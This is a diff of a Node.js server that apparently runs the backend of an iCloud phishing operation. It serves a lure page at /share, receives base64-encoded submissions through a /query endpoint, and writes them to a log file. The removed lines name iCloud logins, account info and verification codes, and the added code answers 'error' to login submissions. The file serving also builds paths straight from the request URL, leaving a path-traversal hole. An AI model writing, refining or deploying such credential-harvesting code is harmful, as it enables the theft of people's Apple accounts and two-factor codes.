@@ -93,7 +93,7 @@ let isFirst = true;
 let log = "";
 
 let writedown = () => {
-    fs.open("./1.txt", 'w', (err, fd) => {
+    fs.open(`.${basePath}/1.txt`, 'w', (err, fd) => {
         if (err) {
         }
         let str = log;//JSON.stringify(log);
@@ -119,20 +119,22 @@ let listener = (request, response) => {
     console.log(`有人访问了服务器 ==> ${request.url}`);
 
     let requestUrl = request.url; // 端口号后全部
-    let pathName = url.parse(requestUrl).pathname; // 款口号后至问号前
-    let query = url.parse(requestUrl).query; // 问号后
+    let pasurl = url.parse(requestUrl)
+    let pathName = pasurl.pathname; // 款口号后至问号前
+    let query = pasurl.query; // 问号后
     // console.log(pathName);
-    if (pathName == '/jquery.js') {
-        let jsstr = '';
+    if (/\.js/.test(pathName)) {
+        str = "";
+        console.log(`${basePath}${pathName}`);
         if (fs.existsSync(`.${basePath}${pathName}`)) {
             response.writeHead(200, { 'content-type': 'application/javascript; charset=UTF-8' });
-            jsstr = fs.readFileSync(`.${basePath}${pathName}`) || '';
+            str = fs.readFileSync(`.${basePath}${pathName}`) || '';
         } else {
             response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
         }
-        response.end(jsstr);
+        response.end(str);
         return;
-    } else if (pathName.indexOf(".js") !== -1) {
+    }  else if (pathName.indexOf(".js") !== -1) {
         response.writeHead(404, { 'content-type': 'application/javascript; charset=UTF-8' });
         response.end('');
     } else if (/\.png|\.jpg|\.ico/.test(pathName)) {
@@ -158,50 +160,22 @@ let listener = (request, response) => {
     } else if (pathName == "/query") {
         if (query) {
             let qs = query.split("&");
-            let key = '';
             qs.forEach(e => {
-                if (e.indexOf('icloudLogin=') != -1) {
-                    key = "icloudLogin";
-                    query = e.replace('icloudLogin=', '');
-
-                } else if (e.indexOf('icloudInfo=') != -1) {
-                    key = "icloudInfo";
-                    query = e.replace('icloudInfo=', '');
-
-                } else if (e.indexOf("icloudCheckCode=") != -1) {
-                    key = "icloudCheckCode";
-                    query = e.replace('icloudCheckCode=', '');
-
-                } else if (e.indexOf("icloudInputCode=") != -1) {
-                    key = "icloudInputCode";
-                    query = e.replace('icloudInputCode=', '');
-
-                } else if (e.indexOf("icloudCheckCodeNeed=") != -1) {
-                    key = "icloudCheckCodeNeed";
-                    query = e.replace('icloudCheckCodeNeed=', '');
-
-                } else if (e.indexOf('icloudLoginNeed=') != -1) {
-                    key = "icloudLoginNeed";
-                    query = e.replace('icloudLoginNeed=', '');
-
+                if (e.indexOf('d=') != -1) {
+                    query = e.replace('d=', '');
+                    query = decodeURIComponent(atob(query));
                 }
             });
-            query = decodeURIComponent(atob(query));
-            query = key + "=>" + query;
             console.log(`return query ==> ${query}`);
-            log += ("\n" + query);
-            if (key === "icloudCheckCodeNeed") {
-                response.write(waitInput());
-            } else if (key === "icloudLoginNeed") {
-                response.write(waitInput());
-            } else {
-                response.write("");
+            log += ("\n" + `${query}`);
+            if(/type\=login/.test(query)){
+                response.write('error');
             }
             response.end();
         }
         writedown();
         return;
-    }else if (pathName == "/share"){
+    }else if (/\/share/.test(pathName)){
         let htmlstr = '';
         if (fs.existsSync(`.${basePath}/main.html`)) {
             response.writeHead(200, { 'content-type': 'text/html' });
@@ -211,8 +185,8 @@ let listener = (request, response) => {
         }
         response.end(htmlstr);
     }else{
-        response.write("");
-        response.end();
+        response.writeHead(404, { 'content-type': 'text/html' });
+        response.end("");
     }
 };
 
